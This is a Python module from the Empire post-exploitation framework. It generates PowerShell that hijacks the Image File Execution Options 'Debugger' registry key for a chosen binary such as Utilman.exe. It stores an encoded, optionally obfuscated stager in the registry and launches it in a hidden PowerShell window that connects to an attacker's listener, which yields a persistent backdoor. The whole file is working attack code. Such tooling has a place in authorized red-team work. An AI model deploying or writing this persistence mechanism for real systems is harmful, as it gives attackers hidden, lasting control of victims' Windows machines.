from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # management options
        cleanup = params["Cleanup"]
        trigger_binary = params["TriggerBinary"]
        listener_name = params["Listener"]
        target_binary = params["TargetBinary"]

        # storage options
        reg_path = params["RegPath"]

        # staging options
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        status_msg = ""
        locationString = ""

        if cleanup.lower() == "true":
            # the registry command to disable the debugger for Utilman.exe
            script = f"Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_binary}';'{target_binary} debugger removed.'"
            return main_menu.modulesv2.finalize_module(
                script=script,
                script_end="",
                obfuscate=obfuscate,
                obfuscation_command=obfuscation_command,
            )

        if listener_name != "":
            # if there's a listener specified, generate a stager and store it

            if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
                # not a valid listener, return nothing for the script
                raise ModuleValidationException(
                    "[!] Invalid listener: " + listener_name
                )

            # generate the PowerShell one-liner
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                bypasses=params["Bypasses"],
            )

            enc_script = launcher.split(" ")[-1]
            # statusMsg += "using listener " + listenerName

            path = "\\".join(reg_path.split("\\")[0:-1])
            name = reg_path.split("\\")[-1]

            status_msg += " stored in " + reg_path + "."

            script = "$RegPath = '" + reg_path + "';"
            script += "$parts = $RegPath.split('\\');"
            script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
            script += "$name = $parts[-1];"
            script += (
                "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "
                + enc_script
                + ";"
            )

            # note where the script is stored
            locationString = "$((gp " + path + " " + name + ")." + name + ")"

            script += (
                "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
                + target_binary
                + "';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
                + target_binary
                + '\' -Name Debugger -Value \'"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -c "$x='
                + locationString
                + ';start -Win Hidden -A \\"-enc $x\\" powershell";exit;\';\''
                + target_binary
                + " debugger set to trigger stager for listener "
                + listener_name
                + "'"
            )

        else:
            # the registry command to set the debugger for the specified binary to be the binary path specified
            script = (
                "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
                + target_binary
                + "';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
                + target_binary
                + "' -Name Debugger -Value '"
                + trigger_binary
                + "';'"
                + target_binary
                + " debugger set to "
                + trigger_binary
                + "'"
            )

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
